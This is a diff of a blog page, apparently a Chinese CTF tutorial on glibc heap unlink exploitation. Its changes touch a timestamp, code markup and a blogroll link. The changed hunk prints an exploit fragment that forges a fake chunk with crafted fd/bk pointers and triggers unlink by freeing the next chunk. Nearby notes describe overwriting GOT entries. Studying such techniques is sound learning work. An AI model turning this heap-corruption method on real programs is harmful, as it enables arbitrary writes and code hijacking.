@@ -101,7 +101,7 @@
 <meta property="og:description" content="Unlink的学习与利用原理0x00 unlink是什么&amp;emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。       （图片来自ctf wiki）   其实操作就是（学过数据结构应该很好理解） 12p-&amp;gt;fd-&amp;gt;bk = p-&amp;gt;bkp-&amp;gt;bk-&amp;gt;fd = p-&amp;gt;fd 0x01 从源代">
 <meta property="og:image" content="https://ctf-wiki.github.io/ctf-wiki/pwn/heap/figure/unlink_smallbin_intro.png">
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006BCyJEgy1fri7bidjmej308x05t3yt.jpg">
-<meta property="og:updated_time" content="2018-05-22T12:58:57.000Z">
+<meta property="og:updated_time" content="2018-05-22T13:05:42.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Unlink的学习与利用">
 <meta name="twitter:description" content="Unlink的学习与利用原理0x00 unlink是什么&amp;emsp; unlink说的是linux系统在进行空闲堆块管理的时候，进行空闲堆块的合并操作。一般发生在程序进行堆块释放之后。       （图片来自ctf wiki）   其实操作就是（学过数据结构应该很好理解） 12p-&amp;gt;fd-&amp;gt;bk = p-&amp;gt;bkp-&amp;gt;bk-&amp;gt;fd = p-&amp;gt;fd 0x01 从源代">
@@ -388,7 +388,7 @@
 <li>首先构造3个chunk：chunk1、chunk2、chunk3，</li>
 <li>利用漏洞溢出chunk2，使chunk2和chunk3合并，利用unlink</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">alloc(0x100)  # id 1</div><div class="line"># begin </div><div class="line">alloc(0x40)  # id 2</div><div class="line"># small chunk size in order to trigger unlink</div><div class="line">alloc(0x80)  # id 3</div><div class="line"># a fake chunk at global[2]=head+16 who&apos;s size is 0x20</div><div class="line">payload = p64(0)  #prev_size</div><div class="line">payload += p64(0x40)  #current size</div><div class="line">payload += p64(head + 16 - 0x18)  #fd +16因为这是bss段，第二个堆块</div><div class="line">payload += p64(head + 16 - 0x10)  #bk</div><div class="line">payload = payload.ljust(0x40, &apos;a&apos;)</div><div class="line"># overwrite global[3]&apos;s chunk&apos;s prev_size</div><div class="line"># make it believe that prev chunk is at chunk2</div><div class="line">payload += p64(0x40)</div><div class="line"># make it believe that prev chunk is free</div><div class="line">payload += p64(0x90)</div><div class="line">edit(2, len(payload), payload)</div><div class="line"># unlink fake chunk, so chunk[2] =&amp;(chunk[2])-0x18=head-8</div><div class="line">free(3)</div></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">alloc(0x100)  # id 1</div><div class="line"># begin </div><div class="line">alloc(0x40)  # id 2</div><div class="line"># small chunk size in order to trigger unlink</div><div class="line">alloc(0x80)  # id 3</div><div class="line"># a fake chunk at global[2]=head+16 who's size is 0x20</div><div class="line">payload = p64(0)  #prev_size</div><div class="line">payload += p64(0x40)  #current size</div><div class="line">payload += p64(head + 16 - 0x18)  #fd +16因为这是bss段，第二个堆块</div><div class="line">payload += p64(head + 16 - 0x10)  #bk</div><div class="line">payload = payload.ljust(0x40, 'a')</div><div class="line"># overwrite global[3]'s chunk's prev_size</div><div class="line"># make it believe that prev chunk is at chunk2</div><div class="line">payload += p64(0x40)</div><div class="line"># make it believe that prev chunk is free</div><div class="line">payload += p64(0x90)</div><div class="line">edit(2, len(payload), payload)</div><div class="line"># unlink fake chunk, so chunk[2] =&amp;(chunk[2])-0x18=head-8</div><div class="line">free(3)</div></pre></td></tr></table></figure>
 <ul>
 <li>修改 chunk0 为 free@got 地址，同时修改chunk1为 puts@got 地址，chunk2 为 atoi@got 地址</li>
 <li>free@got的值覆盖为puts@plt</li>
@@ -595,7 +595,7 @@
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="https://www.magic1an.com" title="Magician" target="_blank">Magician</a>
+                  <a href="www.p0desta.com" title="p0deata" target="_blank">p0deata</a>
                 </li>
               
             </ul>
